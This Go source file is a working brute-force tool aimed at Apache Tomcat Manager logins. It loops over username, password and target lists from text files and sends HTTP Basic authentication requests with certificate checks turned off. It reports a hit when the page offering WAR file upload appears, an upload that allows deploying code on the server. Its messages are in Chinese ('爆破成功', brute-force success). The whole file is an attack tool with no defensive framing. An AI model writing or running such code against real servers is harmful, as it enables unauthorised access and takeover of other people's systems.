package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"github.com/levigross/grequests"
	_ "net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func ReadLines(fileName string) ([]string, error) {
	f, err := os.Open(filepath.Clean(fileName))
	if err != nil {
		return nil, err
	}
	lines := []string{}
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, strings.TrimRight(scanner.Text(), "\r\n"))
	}
	f.Close()
	return lines, scanner.Err()
}

func httpGet(target, Authorizations string) (error, int, string) {
	//proxyURL, err := url.Parse("http://127.0.0.1:8080") // Proxy URL
	//if err != nil {
	//fmt.Println(err)
	//}
	resp, err := grequests.Get(target, &grequests.RequestOptions{
		Headers: map[string]string{"Authorization": "Basic " + Authorizations},
		//Proxies:            map[string]*url.URL{proxyURL.Scheme: proxyURL},
		InsecureSkipVerify: true,
	})
	if err != nil {
		fmt.Println(err)
		return err, 0, ""
	}
	return nil, resp.StatusCode, resp.String()
}

func baopo() {
	userNames, err := ReadLines("username.txt")
	if err != nil {
		fmt.Println("userName 字典报错！")
	}
	passwords, err := ReadLines("password.txt")
	if err != nil {
		fmt.Println("passWord 字典报错！")
	}
	targets, err := ReadLines("target.txt")
	if err != nil {
		fmt.Println("target 字典报错！")
	}
	for _, username := range userNames {
		for _, password := range passwords {
			for _, target := range targets {
				authPass := []byte(username + ":" + password)
				encodeString := string(base64.StdEncoding.EncodeToString(authPass))
				err, statusCode, respString := httpGet(target, encodeString)
				time.Sleep(20 * time.Second)
				if err != nil {
					fmt.Println(err)
				}
				if statusCode == 200 && strings.Contains(respString, "Select WAR file to upload") {
					fmt.Println("爆破成功：", target, username, password)
				}
				fmt.Println("爆破失败：", target, username, password, encodeString)
			}
		}
	}

}

func main() {
	fmt.Println("爆破开始")
	baopo()
	fmt.Println("爆破结束")

}
